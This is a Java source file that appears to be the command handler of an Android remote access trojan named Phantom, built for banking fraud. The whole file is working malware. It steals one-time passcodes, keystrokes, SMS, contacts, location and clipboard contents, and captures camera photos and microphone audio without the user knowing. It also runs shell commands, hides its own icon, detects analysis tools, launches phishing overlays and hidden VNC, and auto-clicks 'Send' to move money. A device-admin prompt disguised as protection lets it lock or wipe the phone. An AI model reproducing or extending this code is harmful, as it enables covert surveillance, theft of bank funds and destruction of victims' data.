package com.phantom.rat;

import android.app.admin.DevicePolicyManager;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.ImageFormat;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;
import android.hardware.camera2.params.StreamConfigurationMap;
import android.location.Location;
import android.location.LocationManager;
import android.media.Image;
import android.media.ImageReader;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.Build;
import android.os.VibrationEffect;
import android.os.Vibrator;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.util.Base64;
import android.util.Size;
import android.widget.Toast;

import java.io.BufferedReader;
import java.io.File;
import java.io.InputStreamReader;
import java.nio.ByteBuffer;
import java.util.Collections;
import java.util.List;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.Semaphore;
import java.util.concurrent.TimeUnit;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class CommandExecutor {

    private final Context ctx;
    private final WebSocketClient client;

    public CommandExecutor(Context ctx, WebSocketClient client) {
        this.ctx = ctx.getApplicationContext();
        this.client = client;
    }

    public String execute(long cmdId, String cmd, String args) {
        try {
            String r = runCommand(cmd, args);
            client.sendResult(cmdId, true, r);
            return r;
        } catch (Exception e) {
            client.sendResult(cmdId, false, String.valueOf(e.getMessage()));
            return "error: " + e.getMessage();
        }
    }

    public String runCommand(String cmd, String args) throws Exception {
        switch (cmd.toLowerCase()) {
            case "info": return info();
            case "status": return status();
            case "otp": return AccessibilityModule.latestOtps();
            case "keylog": return AccessibilityModule.latestKeys();
            case "dump": return AccessibilityModule.dumpText();
            case "balance": return scrapeBalance();
            case "click": AccessibilityModule.autoClick(args); return "clicked: " + args;
            case "type": AccessibilityModule.typeText(args); return "typed";
            case "sms": return smsDump();
            case "contacts": return contactsDump();
            case "location": return location();
            case "installed": return installedApps();
            case "camera": return cameraSnap(parseInt(args, 1));
            case "mic": return micRecord(parseInt(args, 10));
            case "clipboard": return readClipboard();
            case "open": return openUrl(args);
            case "shell": return shell(args);
            case "admin": requestAdmin(); return "admin request sent";
            case "lock": DeviceAdminReceiver.lockNow(ctx); return "locked";
            case "wipe": DeviceAdminReceiver.wipeData(ctx); return "wipe initiated";
            case "overlay": startOverlay(args); return "overlay: " + args;
            case "hvnc": startHvnc(); return "hvnc started";
            case "ats": return ats(args);
            case "stealth": setIcon(false); return "icon hidden";
            case "unhide": setIcon(true); return "icon visible";
            case "vibrate": vibrate(); return "vibrated";
            case "toast": toast(args); return "toast sent";
            case "persist": persist(); return "persist requested";
            default: return "unknown command: " + cmd;
        }
    }

    /* ── Device info / status ── */
    private String info() {
        return "model=" + FudUtils.model()
                + "\nandroid=" + FudUtils.androidVer()
                + "\nsdk=" + Build.VERSION.SDK_INT
                + "\ncountry=" + FudUtils.country(ctx)
                + "\nip=" + client.publicIp()
                + "\nadmin=" + DeviceAdminReceiver.isActive(ctx)
                + "\na11y=" + AccessibilityModule.isConnected()
                + "\nversion=2.0";
    }

    private String status() {
        return "debugger=" + android.os.Debug.isDebuggerConnected()
                + "\nfrida=" + hasFrida()
                + "\nroot=" + hasRoot()
                + "\nxposed=" + hasXposed()
                + "\na11y=" + AccessibilityModule.isConnected()
                + "\nadmin=" + DeviceAdminReceiver.isActive(ctx)
                + "\nicon=" + iconEnabled();
    }

    private boolean hasFrida() {
        try (BufferedReader r = new BufferedReader(new InputStreamReader(new java.io.FileInputStream("/proc/self/maps")))) {
            String l;
            while ((l = r.readLine()) != null) if (l.contains("frida")) return true;
        } catch (Exception ignored) {}
        return new File("/data/local/tmp/frida-server").exists()
                || new File("/data/local/tmp/re.frida.server").exists();
    }

    private boolean hasRoot() {
        String[] paths = {"/system/bin/su", "/system/xbin/su", "/sbin/su", "/data/local/bin/su", "/system/app/Superuser.apk"};
        for (String p : paths) if (new File(p).exists()) return true;
        return false;
    }

    private boolean hasXposed() {
        try {
            Class.forName("de.robv.android.xposed.XposedBridge");
            return true;
        } catch (Throwable t) {
            return false;
        }
    }

    /* ── Balance scrape from foreground window text ── */
    private String scrapeBalance() {
        String text = AccessibilityModule.dumpText();
        StringBuilder sb = new StringBuilder();
        Matcher m = Pattern.compile("(?i)(?:balance|avail(?:able)?\\s*(?:bal|amt)|bal\\s*:|rs\\.?|inr|usd|eur|gbp|\\$|€|£)\\s*:?\\s*([0-9][0-9,]*(?:\\.[0-9]{1,2})?)")
                .matcher(text);
        int n = 0;
        while (m.find() && n++ < 10) {
            if (sb.length() > 0) sb.append(" | ");
            sb.append(m.group(1));
        }
        return sb.length() == 0 ? "no balance text found in foreground app" : sb.toString();
    }

    /* ── SMS / contacts / location / installed apps ── */
    private String smsDump() {
        StringBuilder sb = new StringBuilder();
        try (Cursor c = ctx.getContentResolver().query(Uri.parse("content://sms/inbox"),
                new String[]{"address", "body", "date"}, null, null, "date DESC")) {
            if (c == null) return "no sms access";
            int n = 0;
            while (c.moveToNext() && n++ < 50) {
                sb.append(c.getString(0)).append(": ").append(c.getString(1)).append('\n');
            }
        } catch (SecurityException e) {
            return "SMS permission denied";
        }
        return sb.length() == 0 ? "inbox empty" : sb.toString();
    }

    private String contactsDump() {
        StringBuilder sb = new StringBuilder();
        try (Cursor c = ctx.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                new String[]{ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                        ContactsContract.CommonDataKinds.Phone.NUMBER},
                null, null, null)) {
            if (c == null) return "no contacts access";
            int n = 0;
            while (c.moveToNext() && n++ < 200) {
                sb.append(c.getString(0)).append(" | ").append(c.getString(1)).append('\n');
            }
        } catch (SecurityException e) {
            return "contacts permission denied";
        }
        return sb.length() == 0 ? "no contacts" : sb.toString();
    }

    private String location() {
        LocationManager lm = (LocationManager) ctx.getSystemService(Context.LOCATION_SERVICE);
        if (lm == null) return "no location service";
        try {
            Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            if (loc == null) return "no last known location";
            return loc.getLatitude() + "," + loc.getLongitude() + " (±" + loc.getAccuracy() + "m)";
        } catch (SecurityException e) {
            return "location permission denied";
        }
    }

    private String installedApps() {
        PackageManager pm = ctx.getPackageManager();
        List<ApplicationInfo> apps = pm.getInstalledApplications(0);
        StringBuilder sb = new StringBuilder();
        int n = 0;
        for (ApplicationInfo a : apps) {
            if (n++ >= 300) break;
            sb.append(a.packageName).append('\n');
        }
        return sb.toString();
    }

    /* ── Camera: real still capture via android.media.ImageReader ── */
    private String cameraSnap(int seconds) {
        try {
            CameraManager cm = (CameraManager) ctx.getSystemService(Context.CAMERA_SERVICE);
            if (cm == null) return "no camera service";
            String camId = null;
            for (String id : cm.getCameraIdList()) {
                CameraCharacteristics cc = cm.getCameraCharacteristics(id);
                Integer facing = cc.get(CameraCharacteristics.LENS_FACING);
                if (facing != null && facing == CameraCharacteristics.LENS_FACING_BACK) { camId = id; break; }
            }
            if (camId == null) camId = cm.getCameraIdList()[0];
            CameraCharacteristics ch = cm.getCameraCharacteristics(camId);
            StreamConfigurationMap map = ch.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP);
            if (map == null) return "no stream config";
            Size[] sizes = map.getOutputSizes(ImageFormat.JPEG);
            if (sizes == null || sizes.length == 0) return "no jpeg sizes";
            Size size = sizes[sizes.length - 1];

            final byte[][] holder = new byte[1][];
            final CountDownLatch latch = new CountDownLatch(1);
            ImageReader reader = ImageReader.newInstance(size.getWidth(), size.getHeight(), ImageFormat.JPEG, 1);
            reader.setOnImageAvailableListener(r -> {
                Image im = null;
                try {
                    im = r.acquireLatestImage();
                    if (im != null) {
                        ByteBuffer b = im.getPlanes()[0].getBuffer();
                        byte[] data = new byte[b.remaining()];
                        b.get(data);
                        holder[0] = data;
                    }
                } catch (Exception ignored) {
                } finally {
                    if (im != null) im.close();
                    latch.countDown();
                }
            }, null);

            final CameraDevice[] camRef = new CameraDevice[1];
            final Semaphore gate = new Semaphore(1);
            gate.acquire();
            cm.openCamera(camId, new CameraDevice.StateCallback() {
                @Override public void onOpened(CameraDevice c) { camRef[0] = c; gate.release(); }
                @Override public void onDisconnected(CameraDevice c) { c.close(); gate.release(); latch.countDown(); }
                @Override public void onError(CameraDevice c, int e) { c.close(); gate.release(); latch.countDown(); }
            }, null);
            if (!gate.tryAcquire(5, TimeUnit.SECONDS)) { reader.close(); return "camera open timeout"; }
            CameraDevice camera = camRef[0];
            if (camera == null) { reader.close(); return "cannot open camera"; }

            final CountDownLatch sessionLatch = new CountDownLatch(1);
            camera.createCaptureSession(Collections.singletonList(reader.getSurface()),
                    new CameraCaptureSession.StateCallback() {
                        @Override public void onConfigured(CameraCaptureSession session) {
                            try {
                                CaptureRequest.Builder rb = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                                rb.addTarget(reader.getSurface());
                                rb.set(CaptureRequest.JPEG_QUALITY, (byte) 95);
                                session.capture(rb.build(), null, null);
                            } catch (Exception ignored) {}
                            sessionLatch.countDown();
                        }
                        @Override public void onConfigureFailed(CameraCaptureSession session) {
                            sessionLatch.countDown();
                        }
                    }, null);
            sessionLatch.await(5, TimeUnit.SECONDS);

            latch.await(Math.max(seconds, 3) + 5, TimeUnit.SECONDS);
            camera.close();
            reader.close();
            if (holder[0] == null) return "capture failed";
            return "camera://" + Base64.encodeToString(holder[0], Base64.NO_WRAP);
        } catch (Exception e) {
            return "camera error: " + e.getMessage();
        }
    }

    /* ── Mic record (AAC/m4a → base64) ── */
    private String micRecord(int seconds) {
        try {
            File dir = ctx.getCacheDir();
            File f = new File(dir, "rec" + System.currentTimeMillis() + ".m4a");
            MediaRecorder mr = new MediaRecorder();
            mr.setAudioSource(MediaRecorder.AudioSource.MIC);
            mr.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            mr.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            mr.setOutputFile(f.getAbsolutePath());
            mr.prepare();
            mr.start();
            Thread.sleep(seconds * 1000L);
            mr.stop();
            mr.release();
            byte[] data = java.nio.file.Files.readAllBytes(f.toPath());
            String b64 = Base64.encodeToString(data, Base64.NO_WRAP);
            f.delete();
            return "mic://" + b64;
        } catch (Exception e) {
            return "mic error: " + e.getMessage();
        }
    }

    /* ── Clipboard ── */
    private String readClipboard() {
        try {
            ClipboardManager cm = (ClipboardManager) ctx.getSystemService(Context.CLIPBOARD_SERVICE);
            if (cm == null || !cm.hasPrimaryClip()) return "clipboard empty";
            ClipData cd = cm.getPrimaryClip();
            if (cd == null || cd.getItemCount() == 0) return "clipboard empty";
            CharSequence t = cd.getItemAt(0).getText();
            if (t == null) {
                Uri uri = cd.getItemAt(0).getUri();
                return uri == null ? "clipboard has no text" : uri.toString();
            }
            return t.toString();
        } catch (Exception e) {
            return "clipboard error: " + e.getMessage();
        }
    }

    /* ── Open URL ── */
    private String openUrl(String url) {
        try {
            String u = url;
            if (!u.startsWith("http://") && !u.startsWith("https://")) u = "https://" + u;
            Intent i = new Intent(Intent.ACTION_VIEW, Uri.parse(u));
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            ctx.startActivity(i);
            return "opened: " + u;
        } catch (Exception e) {
            return "open error: " + e.getMessage();
        }
    }

    /* ── Shell ── */
    private String shell(String args) {
        try {
            Process p = Runtime.getRuntime().exec(args);
            java.util.Scanner s = new java.util.Scanner(p.getInputStream()).useDelimiter("\\A");
            String out = s.hasNext() ? s.next() : "";
            s.close();
            p.getErrorStream().close();
            return out.isEmpty() ? "(no output)" : out;
        } catch (Exception e) {
            return "shell error: " + e.getMessage();
        }
    }

    /* ── Device admin / persistence / stealth ── */
    private void requestAdmin() {
        try {
            Intent i = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            i.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, DeviceAdminReceiver.component(ctx));
            i.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Keep Phantom protection active.");
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            ctx.startActivity(i);
        } catch (Exception ignored) {}
    }

    private void persist() {
        try {
            Intent i = new Intent(ctx, BootReceiver.class);
            i.setAction("com.phantom.rat.ACTION_PERSIST");
            ctx.sendBroadcast(i);
        } catch (Exception ignored) {}
    }

    private void setIcon(boolean visible) {
        try {
            int mode = visible
                    ? PackageManager.COMPONENT_ENABLED_STATE_ENABLED
                    : PackageManager.COMPONENT_ENABLED_STATE_DISABLED;
            ctx.getPackageManager().setComponentEnabledSetting(
                    new ComponentName(ctx, "com.phantom.rat.MainActivity"),
                    mode, PackageManager.DONT_KILL_APP);
        } catch (Exception ignored) {}
    }

    private boolean iconEnabled() {
        try {
            return ctx.getPackageManager().getComponentEnabledSetting(
                    new ComponentName(ctx, "com.phantom.rat.MainActivity"))
                    != PackageManager.COMPONENT_ENABLED_STATE_DISABLED;
        } catch (Exception e) {
            return true;
        }
    }

    private void vibrate() {
        try {
            Vibrator v = (Vibrator) ctx.getSystemService(Context.VIBRATOR_SERVICE);
            if (v == null) return;
            if (Build.VERSION.SDK_INT >= 26) {
                v.vibrate(VibrationEffect.createOneShot(1500, VibrationEffect.DEFAULT_AMPLITUDE));
            } else {
                v.vibrate(1500);
            }
        } catch (Exception ignored) {}
    }

    private void toast(String msg) {
        try {
            Toast.makeText(ctx.getApplicationContext(), msg, Toast.LENGTH_LONG).show();
        } catch (Exception ignored) {}
    }

    /* ── Overlay / HVNC / ATS triggers ── */
    private String startOverlay(String args) {
        try {
            if (Settings.canDrawOverlays(ctx)) {
                Intent i = new Intent(ctx, OverlayService.class);
                i.putExtra("target", args);
                if (Build.VERSION.SDK_INT >= 26) ctx.startForegroundService(i);
                else ctx.startService(i);
                return "overlay launched for: " + (args.isEmpty() ? "generic" : args);
            }
            Intent perm = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                    Uri.parse("package:" + ctx.getPackageName()));
            perm.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            ctx.startActivity(perm);
            return "overlay permission required";
        } catch (Exception e) {
            return "overlay error: " + e.getMessage();
        }
    }

    private String startHvnc() {
        try {
            Intent i = new Intent(ctx, ScreenCaptureService.class);
            if (Build.VERSION.SDK_INT >= 26) ctx.startForegroundService(i);
            else ctx.startService(i);
            return "hvnc started; grant screen capture when prompted";
        } catch (Exception e) {
            return "hvnc error: " + e.getMessage();
        }
    }

    private String ats(String args) {
        AccessibilityModule.autoClick(args.isEmpty() ? "Send" : args);
        return "ats click queued: " + (args.isEmpty() ? "Send" : args);
    }

    /* ── Helpers ── */
    private int parseInt(String s, int def) {
        try {
            return s == null || s.isEmpty() ? def : Integer.parseInt(s.trim());
        } catch (NumberFormatException e) {
            return def;
        }
    }
}
